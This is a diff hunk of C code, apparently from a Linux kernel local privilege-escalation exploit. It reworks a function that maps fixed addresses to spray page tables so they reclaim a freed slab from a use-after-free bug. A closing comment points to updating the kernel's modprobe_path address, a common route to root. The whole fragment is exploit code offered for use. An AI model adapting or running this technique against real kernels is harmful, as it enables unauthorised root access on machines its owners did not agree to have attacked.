@@ -115,29 +115,36 @@ int act(int act_fd, int code, int n, char *args)
 /* Page table bits: Dirty | Accessed | User | Write | Present */
 #define PT_BITS 0x67
 
-int prepare_page_tables()
+int prepare_page_tables(void)
 {
-	/* prepare infra */
-	void *retv = mmap((void *)PT_INDICES_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE,
+	unsigned long *addr = NULL;
+	long i = 0;
+
+	/* Allocate page table hierarchy */
+	addr = mmap(PT_INDICES_TO_VIRT(1, 0, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
 			  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	*(unsigned int *)PT_INDICES_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
-	if (retv == MAP_FAILED) {
+	if (addr == MAP_FAILED) {
 		perror("[-] mmap");
 		return EXIT_FAILURE;
 	}
+	*addr = 0xcafecafe;
 
-	/* pre-register new tables and entries */
-	for (unsigned long long i = 0; i < 512; i++) {
-		retv = mmap((void *)PT_INDICES_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE,
+	/*
+	 * Prepare the resources for PTE that will later reclaim
+	 * the freed slab containing UAF object.
+	 */
+	for (i = 0; i < PT_ENTRIES; i++) {
+		addr = mmap(PT_INDICES_TO_VIRT(1, 0, 1, i, 0), PAGE_SIZE, PROT_WRITE,
 			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+		if (addr == MAP_FAILED) {
+			perror("[-] mmap");
+			return EXIT_FAILURE;
+		}
 	}
-	if (retv == MAP_FAILED) {
-		perror("[-] mmap");
-		return EXIT_FAILURE;
-	}
-	printf("[+] done, PTE is ready for allocation\n");
 
-	return 0;
+	printf("[+] page tables are prepared\n");
+
+	return EXIT_SUCCESS;
 }
 
 /* Update the address of modprobe_path for your kernel: */
